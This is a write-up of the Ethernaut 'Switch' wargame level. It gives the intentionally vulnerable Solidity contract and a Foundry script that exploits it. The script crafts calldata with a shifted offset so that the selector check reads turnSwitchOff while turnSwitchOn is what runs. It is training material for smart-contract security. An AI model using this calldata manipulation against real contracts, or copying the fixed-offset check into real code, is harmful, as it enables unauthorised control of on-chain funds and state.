---
title: "Switch"
date: "2024-02-25T10:57:00.000Z"
lastmod: "2024-03-11T18:07:00.000Z"
draft: false
difficulty: "⭐⭐⭐⭐"
prev: "Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
weight: 30
state: "En cours"
level-url: "https://ethernaut.openzeppelin.com/level/29"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "5a3e0503-8dd1-4730-9496-128b2ad2bd09"
  created_time: "2024-02-25T10:57:00.000Z"
  last_edited_time: "2024-03-11T18:07:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel29.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "f9c2f40a-0144-4e6d-a134-6b9fd725f7a9"
        name: "⭐⭐⭐⭐"
        color: "red"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 30
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "e1f6ef4b-49ae-427f-9bb4-8736089f3aa2"
        name: "En cours"
        color: "blue"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/29"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text: []
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Switch"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Switch"
          href: null
  url: "https://www.notion.so/Switch-5a3e05038dd147309496128b2ad2bd09"
  public_url: null
UPDATE_TIME: "2024-03-11T18:08:05.881Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Just have to flip the switch. Can't be that hard, right?


### Things that might help:


Understanding how `CALLDATA` is encoded.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Switch} from '../src/29.sol';

contract POC is Script {

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address addr = vm.envAddress("INSTANCE_29");

    vm.startBroadcast(deployerPrivateKey);

    Switch s = Switch(addr);

    console.log('switchOn : %s', s.switchOn());

    // Default
    // 30c13ade
    // 0000000000000000000000000000000000000000000000000000000000000020 0 // point to 20
    // 0000000000000000000000000000000000000000000000000000000000000004 20
    // 20606e1500000000000000000000000000000000000000000000000000000000 40

    // Hacked
    // 30c13ade
    // 0000000000000000000000000000000000000000000000000000000000000060 0  // point to 60
    // 0000000000000000000000000000000000000000000000000000000000000004 20
    // 20606e1500000000000000000000000000000000000000000000000000000000 40 // skipped
    // 0000000000000000000000000000000000000000000000000000000000000004 60
    // 76227e1200000000000000000000000000000000000000000000000000000000 80 // actually called

    bytes memory payload = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

    (bool success,) = address(s).call(payload);
    require(success);

    console.log('switchOn : %s', s.switchOn());


    vm.stopBroadcast();

  }
}

```

